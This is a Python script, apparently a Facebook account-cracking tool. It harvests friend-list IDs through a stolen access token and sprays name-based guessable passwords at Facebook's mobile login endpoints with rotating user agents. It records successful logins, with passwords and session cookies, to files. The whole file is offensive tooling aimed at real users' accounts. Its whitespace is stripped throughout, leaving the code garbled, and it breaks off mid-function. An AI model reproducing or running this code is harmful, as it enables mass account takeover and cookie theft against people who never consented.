#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.panel import Panel
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
import uuid
ah="BR3K-"
imt="-M1472=="
ak="ANANY-"
myid=uuid.uuid4().hex[:10].upper()

#------------------[USER-AGENT]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
prox=requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
open('.prox.txt','w').write(prox)
exceptExceptionase:
print('[[\x1b[1;92m•\x1b[1;97m][\x1b[1;96mhasim_ganz...')
prox=open('.prox.txt','r').read().splitlines()
forxinrange(1000):
rr=random.randint
rc=random.choice
A=f'Mozilla/5.0(Linux;Android6.0;SM-G532GBuild/MMB29K)AppleWebKit/537.36(KHTML,likeGecko)Chrome/50.0.2661.89MobileSafari/E7FBAF'
B=f'Mozilla/5.0(Linux;Android10;SM-A105M)AppleWebKit/537.36(KHTML,likeGecko)Chrome/107.0.5214.142MobileSafari/537.36'
C=f'Mozilla/5.0Macintosh;IntelMacOSX10_10_2)AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}(KHTML,likeGecko)Version/{str(rr(20,100))}.0.{str(rr(1111,9999))}Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}'
D=f'Mozilla/5.0Macintosh;IntelMacOSX10_10_2)AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}(KHTML,likeGecko)Version/{str(rr(20,100))}.0.{str(rr(1111,9999))}Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}'
F=f'Mozilla/5.0Macintosh;IntelMacOSX10_10_2)AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}(KHTML,likeGecko)Version/{str(rr(20,100))}.0.{str(rr(1111,9999))}Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}'
uaku=f'{A}{B}{C}{D}{F}'
ugen.append(uaku)
forxinrange(10):
a='Mozilla/5.0(SAMSUNG;SAMSUNG-GT-S'
b=random.randrange(100,9999)
c=random.randrange(100,9999)
d=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
e=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
f=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
g=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
h=random.randrange(1,9)
i=';U;Bada/1.2;en-us)AppleWebKit/533.1(KHTML,likeGecko)Dolfin/'
j=random.randrange(1,9)
k=random.randrange(1,9)
l='MobileWVGASMM-MMS/1.2.0OPN-B'
uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k}{l}'
ugen.append(uak)

defuaku():
try:
ua=open('bbnew.txt','r').read().splitlines()
forubinua:
ugen.append(ub)
except:
a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
ua=open('.bbnew.txt','w')
aa=re.findall('line">(.*?)<',str(a))
foruninaa:
ua.write(un+'\n')
ua=open('.bbnew.txt','r').read().splitlines()
#------------[INDICATION]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni=[],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[WARNA]--------------#
P='\x1b[1;97m'
M='\x1b[1;91m'
H='\x1b[1;92m'
K='\x1b[1;93m'
B='\x1b[1;94m'
U='\x1b[1;95m'
O='\x1b[1;96m'
N='\x1b[0m'
Z="\033[1;30m"
sir='\033[41m\033[93m'
x='\33[m'#DEFAULT
m='\x1b[1;91m'#RED+
k='\033[93m'#KUNING+
h='\x1b[1;92m'#HIJAU+
hh='\033[32m'#HIJAU-
u='\033[95m'#UNGU
kk='\033[33m'#KUNING-
b='\33[1;96m'#BIRU-
p='\x1b[0;34m'#BIRU+
asu=random.choice([m,k,h,u,b,p,kk,hh,Z,N,O,U,B,K,H,M,P])
#--------------------[CONVERTER-BULAN]--------------#
dic={'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2={'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl=datetime.datetime.now().day
bln=dic[(str(datetime.datetime.now().month))]
thn=datetime.datetime.now().year
okc='OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc='CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[MACHINE-SUPPORT]---------------#
defrenv_xy(u):
foreinu+"\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
defclear():
os.system('clear')
defback():
login()
#------------------[LOGO-BANNER]-----------------#
defbanner():
print(f"""{m}
█████╗███╗██╗█████╗███╗██╗██╗██╗
██╔══██╗████╗██║██╔══██╗████╗██║╚██╗██╔╝
███████║██╔██╗██║███████║██╔██╗██║╚████╔╝
██╔══██║██║╚██╗██║██╔══██║██║╚██╗██║╚██╔╝
██║██║██║╚████║██║██║██║╚████║██║
╚═╝╚═╝╚═╝╚═══╝╚═╝╚═╝╚═╝╚═══╝╚═╝
MYTELE:@Exta_anany""")


#--------------------[BAGIAN-MASUK]--------------#
deflogin():
try:
token=open('.token.txt','r').read()
cok=open('.cok.txt','r').read()
tokenku.append(token)
try:
sy=requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0],cookies={'cookie':cok})
sy2=json.loads(sy.text)['name']
sy3=json.loads(sy.text)['id']
menu(sy2,sy3)
exceptKeyError:
login_lagi334()
exceptrequests.exceptions.ConnectionError:
li='PROBLEMINTERNETCONNECTION,CHECKANDTRYAGAIN'
lo=mark(li,style='red')
sol().print(lo,style='cyan')
exit()
exceptIOError:
login_lagi334()
deflogin_lagi334():
try:
os.system('clear')
banner()
cetak(nel('\tCookiesCaptureExtensionSuggestion:[green]Cookiedough[white]'))
asu=random.choice([m,k,h,b,u])
cookie=input(f'EnterCookies:{asu}')
data=requests.get("https://business.facebook.com/business_locations",headers={"user-agent":"NokiaX3-02/5.0(06.05)Profile/MIDP-2.1Configuration/CLDC-1.1Mozilla/5.0AppleWebKit/420+(KHTML,likeGecko)Safari/420+","referer":"https://www.facebook.com/","host":"business.facebook.com","origin":"https://business.facebook.com","upgrade-insecure-requests":"1","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[insertedbycythontoavoidcommentcloser]/[insertedbycythontoavoidcommentstart]*;q=0.8","content-type":"text/html;charset=utf-8"},cookies={"cookie":cookie})
find_token=re.search("(EAAG\w+)",data.text)
ken=open(".token.txt","w").write(find_token.group(1))
cok=open(".cok.txt","w").write(cookie)
print(f'{x}[{h}•{x}]{h}LOGINSUCCESSFUL.........Runthecommandagain!!!!{x}');time.sleep(1)
exit()
exceptExceptionase:
os.system("rm-f.token.txt")
os.system("rm-f.cok.txt")
print(f'%s[%sx%s]%sLOGINFAILED.....CHECKYOURACCOUNT!!%s'%(x,k,x,m,x))
exit()
#------------------[BAGIAN-MENU]----------------#
defmenu(my_name,my_id):
try:
token=open('.token.txt','r').read()
cok=open('.cok.txt','r').read()
exceptIOError:
print('[×]ExpiredCookies')
time.sleep(5)
login_lagi334()
os.system('clear')
banner()
print('')
ip=requests.get("https://api.ipify.org").text
print('')
print(f'└──>SelectMenu{x}')
print('')
print('1.CreckIdPublik')
print('2.HasilCrack')
print('0.Exit')
_____renv__renv_____=input('\n>>Select:')
print('')
if_____renv__renv_____in['1']:
dump_massal()
elif_____renv__renv_____in['2']:
result()
elif_____renv__renv_____in['0']:
os.system('rm-rf.token.txt')
os.system('rm-rf.cookie.txt')
print('>>SuccessfullyLogout+DeleteCookies')
exit()
else:
print('>>inputcorrectly')
back()
deferror():
print(f'{k}>>Sorry,thisfeatureisstillbeingfixed{x}')
time.sleep(4)
back()
#-----------------[HASIL-CRACK]-----------------#
defresult():
print('➪1.HasilCPAnda')
print('➪2.HasilOKAnda')
print('➪0.Kembali')
kz=input('\n➪Pilih:')
ifkzin['1','01']:
try:vin=os.listdir('CP')
exceptFileNotFoundError:
print('➪Filemukagakadangen')
time.sleep(3)
back()
iflen(vin)==0:
print('➪AndaTidakMemilikiHasilCP')
time.sleep(2)
back()
else:
cih=0
lol={}
forisiinvin:
try:hem=open('CP/'+isi,'r').readlines()
except:continue
cih+=1
ifcih<10:
nom='0'+str(cih)
lol.update({str(cih):str(isi)})
lol.update({nom:str(isi)})
print('['+nom+']'+isi+'['+str(len(hem))+'Account]'+x)
else:
lol.update({str(cih):str(isi)})
print('['+str(cih)+']'+isi+'['+str(len(hem))+'Account]'+x)
geeh=input('\n>>Pilih:')
try:geh=lol[geeh]
exceptKeyError:
print('>>PilihYangBenerKontol')
exit()
try:lin=open('CP/'+geh,'r').read().splitlines()
except:
print('>>FileTidakDiTemukan')
time.sleep(2)
back()
nocp=0
forcpkuinrange(len(lin)):
cpkuni=lin[nocp].split('|')
cpkuh=f'#ID:{cpkuni[0]}PASSWORD:{cpkuni[1]}'
sol().print(mark(cpkuh,style="yellow"))
nocp+=1
input('[KlikEnter]')
back()
elifkzin['2','02']:
try:vin=os.listdir('OK')
exceptFileNotFoundError:
print('>>FileTidakDiTemukan')
time.sleep(2)
back()
iflen(vin)==0:
print('>>AndaTidakMempunyaiFileOK')
time.sleep(2)
back()
else:
cih=0
lol={}
forisiinvin:
try:hem=open('OK/'+isi,'r').readlines()
except:continue
cih+=1
ifcih<100:
nom='0'+str(cih)
lol.update({str(cih):str(isi)})
lol.update({nom:str(isi)})
print('['+nom+']'+isi+'['+str(len(hem))+'Account]'+x)
else:
lol.update({str(cih):str(isi)})
print('['+str(cih)+']'+isi+'['+str(len(hem))+'Account]'+x)
geeh=input('\n>>Pilih:')
try:geh=lol[geeh]
exceptKeyError:
print('>>PilihYangBenerKontol')
exit()
try:lin=open('OK/'+geh,'r').read().splitlines()
except:
print('>>FileTidakDiTemukan')
time.sleep(2)
back()
nocp=0
forcpkuinrange(len(lin)):
cpkuni=lin[nocp].split('|')
cpkuh=f'#ID:{cpkuni[0]}PASSWORD:{cpkuni[1]}'
sol().print(mark(cpkuh,style="green"))
print(f'{hh}COOKIE:{x}{cpkuni[2]}')
nocp+=1
input('[KlikEnter]')
back()
elifkzin['0','00']:
back()
else:
print('>>PilihYangBenerKontol')
exit()
#-------------------[CRACK-PUBLIK]----------------#
defdump_massal():
try:
token=open('.token.txt','r').read()
cok=open('.cok.txt','r').read()
exceptIOError:
exit()
try:
jum=int(input('└──inputtargetamount?:'))
exceptValueError:
print('└──>wronginput')
exit()
ifjum<1orjum>100:
print('└──>FailedDumpIdmaybeidisnotpublic')
exit()
ses=requests.Session()
yz=0
formetinrange(jum):
yz+=1
kl=input('└──EntertheId'+str(yz)+':')
uid.append(kl)
foruserrinuid:
try:
col=ses.get('https://graph.facebook.com/v1.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookies':cok}).json()
formiincol['friends']['data']:
try:
iso=(mi['id']+'|'+mi['name'])
ifisoinid:pass
else:id.append(iso)
except:continue
except(KeyError,IOError):
pass
exceptrequests.exceptions.ConnectionError:
print('└──unstablesignal')
exit()
try:
print('')
print(f'└──TotalIdCollected{h}'+str(len(id)))
setting()
exceptrequests.exceptions.ConnectionError:
print(f'{x}')
print('>>unstablesignal')
back()
except(KeyError,IOError):
print(f'>>{k}FriendshipNotPublic{x}')
time.sleep(3)
back()
#-------------[PENGATURAN-IDZ]---------------#
defsetting():
print(f'\n{x}└──>IDOrderSetting')
print('')
print(f'{u}1.IdOldToNew')
print(f'{u}2.IdNewToOld')
print(f'{u}3.IdRandom{x}')
print('')
hu=input('Select:')
ifhuin['1','01']:
fortuainsorted(id):
id2.append(tua)

elifhuin['2','02']:
muda=[]
forbacotinsorted(id):
muda.append(bacot)
bcm=len(muda)
bcmi=(bcm-1)
forxmudinrange(bcm):
id2.append(muda[bcmi])
bcmi-=1
elifhuin['3','03']:
forbacotinid:
xx=random.randint(0,len(id2))
id2.insert(xx,bacot)
else:
print('└──>inputcorrectly')
exit()
print('')

print('\n└──>InputMetodeURLLogin')
print('')
print(f'1.loginfrom{b}Metode1{x}(Disarankan)')
print(f'2.loginfrom{b}Metode2{x}(free)')
print(f'3.loginfrom{b}Metode3{x}(mbasic)')
print(f'4.loginfrom{b}Metode4{x}(Unipin)')
print('')
hc=input('└──>Pilih:')
ifhcin['1','01']:
method.append('mobile')
elifhcin['2','02']:
method.append('free')
elifhcin['3','03']:
method.append('mbasic')
elifhcin['4','04']:
method.append('unipin')
else:
method.append('mobile')
print('')
pwplus=input('└──>AddPasswordManual(Y/t)')
print('')
ifpwplusin['y','Y']:
pwpluss.append('ya')
cetak('Enteranadditionalpasswordofatleast6characters\nExample:[green]Indonesia,rahasia,katasandi[white]')
pwku=input('EnterAdditionalPassword:')
pwkuh=pwku.split(',')
forxpwinpwkuh:
pwnya.append(xpw)
else:
pwpluss.append('no')
passwrd()
#-------------------[BAGIAN-WORDLIST]------------#
defpasswrd():
print('')
print(f'├──>Results{h}OK{x}Savein:{h}OK/%s{x}'%(okc))
print(f'├──>Results{k}CP{x}Savein:{k}CP/%s{x}'%(cpc))
print(f'├──>PlayAirplaneModeEvery500ID\n')
withtred(max_workers=30)aspool:
foryuzonginid2:
idf,nmf=yuzong.split('|')[0],yuzong.split('|')[1].lower()
frs=nmf.split('')[0]
pwv=[]
iflen(nmf)<6:
iflen(frs)<3:
pass
else:
pwv.append(nmf)
pwv.append(frs+'12345')
pwv.append(frs+'1234')
pwv.append(frs+'321')
pwv.append(frs+'123')
else:
iflen(frs)<3:
pwv.append(nmf)
else:
pwv.append(nmf)
pwv.append(frs+'12345')
pwv.append(frs+'1234')
pwv.append(frs+'321')
pwv.append(frs+'123')
if'ya'inpwpluss:
forxpwdinpwnya:
pwv.append(xpwd)
else:pass
if'mobile'inmethod:
pool.submit(crack,idf,pwv)
elif'free'inmethod:
pool.submit(crackfree,idf,pwv)
elif'mbasic'inmethod:
pool.submit(crackmbasic,idf,pwv)
elif'unipin'inmethod:
pool.submit(crackunipin,idf,pwv)
else:
pool.submit(crackmbasic,idf,pwv)
print('')
cetak('\t[cyan]>>[green]SuccesfullyCrack,DontForgetSendYourFeedbackAfterUseMyScript[cyan]<<[white]')
print('')
print(f'{h}OK:{h}%s'%(ok))
print(f'{k}CP:{k}%s{x}'%(cp))
print('')
print(f'\t{x}>>{k}GoodByeThanksToUsingMyScript{x}<<')
#--------------------[METODE-MOBILE]-----------------#
defcrack(idf,pwv):
globalloop,ok,cp
bi=random.choice(['\33[m'])
pers=loop*100/len(id2)
fff='%'
print('\r%s%s/%sok:%s/cp:%s%s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x),end='');sys.stdout.flush()
ua=random.choice(ugen)
ua2=random.choice(ugen)
ses=requests.Session()
forpwinpwv:
try:
ses.headers.update({'Host':'m.facebook.com','cache-control':'max-age=0','sec-ch-ua-mobile':'?1','upgrade-insecure-requests':'1','user-agent':ua,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
p=ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https://m.facebook.com/v3.2/dialog/oauth?client_id=482073673212185&state=37b028b6339f6f2777d4e2fc0db91682&response_type=code&sdk=php-sdk-5.7.0&redirect_uri=%2F%2Fwww.kilat.com%2Ffb-callback&scope=email&ret=login&fbapp_pres=0&logger_id=be57d345-612d-4f3b-851e-a59c6dab44e6&tp=unspecified&cancel_url=?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=37b028b6339f6f2777d4e2fc0db91682#_=_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
dataa={"lsd":re.search('name="lsd"value="(.*?)"',str(p.text)).group(1),"jazoest":re.search('name="jazoest"value="(.*?)"',str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v3.2/dialog/oauth?client_id=482073673212185&state=f51b694bdb918f8ade856ee4124d5aa7&tp=unspecified","flow":"login_no_pin","pass":pw,}
koki=(";").join(["%s=%s"%(key,value)forkey,valueinp.cookies.get_dict().items()])
koki+='m_pixel_ratio=2.625;wd=412x756'
heade={'Host':'m.facebook.com','cache-control':'max-age=0','sec-ch-ua':'"NotA;Brand";v="99","Chromium";v="98"','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','upgrade-insecure-requests':'1','origin':'https://m.facebook.com','content-type':'application/x-www-form-urlencoded','user-agent':ua,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with':'XMLHttpRequest','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https://m.facebook.com/v3.2/dialog/oauth?client_id=482073673212185&state=37b028b6339f6f2777d4e2fc0db91682&response_type=code&sdk=php-sdk-5.7.0&redirect_uri=%2F%2Fwww.kilat.com%2Ffb-callback&scope=email&ret=login&fbapp_pres=0&logger_id=be57d345-612d-4f3b-851e-a59c6dab44e6&tp=unspecified&cancel_url=?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=37b028b6339f6f2777d4e2fc0db91682#_=_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding':'gzip,deflate,br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
po=ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie':koki},headers=heade,allow_redirects=False)
if"checkpoint"inpo.cookies.get_dict().keys():
print(f'\rID:{kk}{idf}{P}\nPW:{kk}{pw}{P}\nUserAgent:{kk}{ua}{P}\n')
open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
akun.append(idf+'|'+pw)
cp+=1
break
elif"c_user"inses.cookies.get_dict().keys():
ok+=1
coki=po.cookies.get_dict()
kuki=(";").join(["%s=%s"%(key,value)forkey,valueinses.cookies.get_dict().items()])
print(f'\rID:{hh}{idf}{P}\nPW:{hh}{pw}{P}\nCookie:{hh}{kuki}{P}\n')
open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
cek_apk(session,coki)
break

else:
continue
exceptrequests.exceptions.ConnectionError:
time.sleep(31)
loop+=1
#------------------[METHODE-FREE-FB]-------------------#
defcrackfree(idf,pwv):
globalloop,ok,cp
bi=random.choice(['\33[m'])
pers=loop*100/len(id2)
fff='%'
print('\r%s%s/%sok:%s/cp:%s%s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x),end='');sys.stdout.flush()
ua=random.choice(ugen)
ua2=random.choice(ugen)
ses=requests.Session()
forpwinpwv:
try:
ses.headers.update({'Host':'m.facebook.com','cache-control':'max-age=0','sec-ch-ua-mobile':'?1','upgrade-insecure-requests':'1','user-agent':ua,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
p=ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https://m.facebook.com/v3.0/dialog/oauth?response_type=code&client_id=1445590775686116&redirect_uri=https%3A%2F%2Fko-fi.com%2Fsignin-facebook&scope=public_profile%2Cemail%2Cemail%2Cpublic_profile&state=vbSdc_hPaBBquqYENpR4KOhId-QSkEUXLm017XWvpAexWHfw-KwNSUrrIdSSjzLlkSI_zFnPTzZ7EFxVEyJcRLVfSahQSZXwaGFcSHd_-UcB3Pmuc08XfyB5huxvyLyr4ST5iJ8XEycZFBy-4ji6KXFdfzT000QCCX_iU9xkzWGY3Q-9s8VoTABV4u7eiWMg_N1VOrXWt22PCErl-gO5fUFEg06-YpJ1DlNXQ8737wEveKztngR4yoFYljCTbDc9vlx5_pf8_AdRbh8lZiTndw&ret=login&fbapp_pres=0&logger_id=51e08038-37df-47b3-bc62-4cb7436000ab&tp=unspecified&cancel_url=https://ko-fi.com/signin-facebook?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=vbSdc_hPaBBquqYENpR4KOhId-QSkEUXLm017XWvpAexWHfw-KwNSUrrIdSSjzLlkSI_zFnPTzZ7EFxVEyJcRLVfSahQSZXwaGFcSHd_-UcB3Pmuc08XfyB5huxvyLyr4ST5iJ8XEycZFBy-4ji6KXFdfzT000QCCX_iU9xkzWGY3Q-9s8VoTABV4u7eiWMg_N1VOrXWt22PCErl-gO5fUFEg06-YpJ1DlNXQ8737wEveKztngR4yoFYljCTbDc9vlx5_pf8_AdRbh8lZiTndw#_=_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
dataa={"lsd":re.search('name="lsd"value="(.*?)"',str(p.text)).group(1),"jazoest":re.search('name="jazoest"value="(.*?)"',str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v3.0/dialog/oauth?response_type=code&client_id=1445590775686116&redirect_uri=https://ko-fi.com/signin-facebook&scope=public_profile,email,email,public_profile&state=cWTfN5jlEs1YxdPWXp_jmUmOQNY35IHHO-pyDm6gZhim6_5yQAUDK2MrTUfy8IyTyVo0aRA9pgRe-7W_g5K6UpOKZLjolHKfJmCN63SjShrljEEbzFDbExFpFEskwOLr_IAEVeZZuTxJbgBXmWI-Y6Ma8qNHRr5DK3YCwHRW1dWA93zXNh1cgx_bDlbzR7smXu52xbnfFS0zkN77qFNxpM7cwfeV_ml6a35I8gl5hdeNH8CMTYl2UOS-rj10sau_y4IbnIzHD76fhVQ81oNRig&tp=unspecified","flow":"login_no_pin","pass":pw,}
koki=(";").join(["%s=%s"%(key,value)forkey,valueinp.cookies.get_dict().items()])
koki+='m_pixel_ratio=2.625;wd=412x756'
heade={'Host':'m.facebook.com','cache-control':'max-age=0','sec-ch-ua':'"NotA;Brand";v="99","Chromium";v="98"','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','upgrade-insecure-requests':'1','origin':'https://m.facebook.com','content-type':'application/x-www-form-urlencoded','user-agent':ua,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with':'XMLHttpRequest','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https://m.facebook.com/v3.0/dialog/oauth?response_type=code&client_id=1445590775686116&redirect_uri=https%3A%2F%2Fko-fi.com%2Fsignin-facebook&scope=public_profile%2Cemail%2Cemail%2Cpublic_profile&state=vbSdc_hPaBBquqYENpR4KOhId-QSkEUXLm017XWvpAexWHfw-KwNSUrrIdSSjzLlkSI_zFnPTzZ7EFxVEyJcRLVfSahQSZXwaGFcSHd_-UcB3Pmuc08XfyB5huxvyLyr4ST5iJ8XEycZFBy-4ji6KXFdfzT000QCCX_iU9xkzWGY3Q-9s8VoTABV4u7eiWMg_N1VOrXWt22PCErl-gO5fUFEg06-YpJ1DlNXQ8737wEveKztngR4yoFYljCTbDc9vlx5_pf8_AdRbh8lZiTndw&ret=login&fbapp_pres=0&logger_id=51e08038-37df-47b3-bc62-4cb7436000ab&tp=unspecified&cancel_url=https://ko-fi.com/signin-facebook?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=vbSdc_hPaBBquqYENpR4KOhId-QSkEUXLm017XWvpAexWHfw-KwNSUrrIdSSjzLlkSI_zFnPTzZ7EFxVEyJcRLVfSahQSZXwaGFcSHd_-UcB3Pmuc08XfyB5huxvyLyr4ST5iJ8XEycZFBy-4ji6KXFdfzT000QCCX_iU9xkzWGY3Q-9s8VoTABV4u7eiWMg_N1VOrXWt22PCErl-gO5fUFEg06-YpJ1DlNXQ8737wEveKztngR4yoFYljCTbDc9vlx5_pf8_AdRbh8lZiTndw#_=_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding':'gzip,deflate,br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
po=ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie':koki},headers=heade,allow_redirects=False)
if"checkpoint"inpo.cookies.get_dict().keys():
print(f'\rID:{kk}{idf}{P}\nPW:{kk}{pw}{P}\nUserAgent:{kk}{ua}{P}\n')
open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
akun.append(idf+'|'+pw)
cp+=1
break
elif"c_user"inses.cookies.get_dict().keys():
ok+=1
coki=po.cookies.get_dict()
kuki=(";").join(["%s=%s"%(key,value)forkey,valueinses.cookies.get_dict().items()])
print(f'\rID:{hh}{idf}{P}\nPW:{hh}{pw}{P}\nCookie:{hh}{kuki}{P}\n')
open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
cek_apk(session,coki)
break

else:
continue
exceptrequests.exceptions.ConnectionError:
time.sleep(31)
loop+=1
#----------------------[METHODE-MBASIC]-----------------#
defcrackmbasic(idf,pwv):
globalloop,ok,cp
bi=random.choice(['\33[m'])
pers=loop*100/len(id2)
fff='%'
print('\r%s%s/%sok:%s/cp:%s%s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x),end='');sys.stdout.flush()
ua=random.choice(ugen)
ua2=random.choice(ugen)
ses=requests.Session()
forpwinpwv:
try:
ses.headers.update({'Host':'m.facebook.com','cache-control':'max-age=0','sec-ch-ua-mobile':'?1','upgrade-insecure-requests':'1','user-agent':ua,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
p=ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https://m.facebook.com/v3.2/dialog/oauth?client_id=482073673212185&state=2916998a1f449ba3ee9407b085e05c4c&response_type=code&sdk=php-sdk-5.7.0&redirect_uri=%2F%2Fwww.kilat.com%2Ffb-callback&scope=email&ret=login&fbapp_pres=0&logger_id=e0e798ae-ef69-48de-a514-1612484d66b2&tp=unspecified&cancel_url=?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=2916998a1f449ba3ee9407b085e05c4c#_=_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
dataa={"lsd":re.search('name="lsd"value="(.*?)"',str(p.text)).group(1),"jazoest":re.search('name="jazoest"value="(.*?)"',str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v3.2/dialog/oauth?client_id=482073673212185&state=f51b694bdb918f8ade856ee4124d5aa7&tp=unspecified","flow":"login_no_pin","pass":pw,}
koki=(";").join(["%s=%s"%(key,value)forkey,valueinp.cookies.get_dict().items()])
koki+='m_pixel_ratio=2.625;wd=412x756'
heade={'Host':'m.facebook.com',
'cache-control':'max-age=0',
'content-length':'2435',
'scheme':'https',
'sec-ch-ua':'"Chromium";v="106","GoogleChrome";v="106","Not;A=Brand";v="99"',
'sec-ch-ua-mobile':'?1',
'sec-ch-ua-platform':'"Android"',
'upgrade-insecure-requests':'1',
'origin':'https://m.facebook.com',
'content-type':'text/html;charset=utf-8',
'user-agent':ua,
'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'x-requested-with':'XMLHttpRequest',
'x-response-format':'JSONStream',
'x-fb-lsd':'AVrgQ9hWv8k',
'sec-fetch-site':'same-origin',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'content-type':'application/x-www-form-urlencoded',
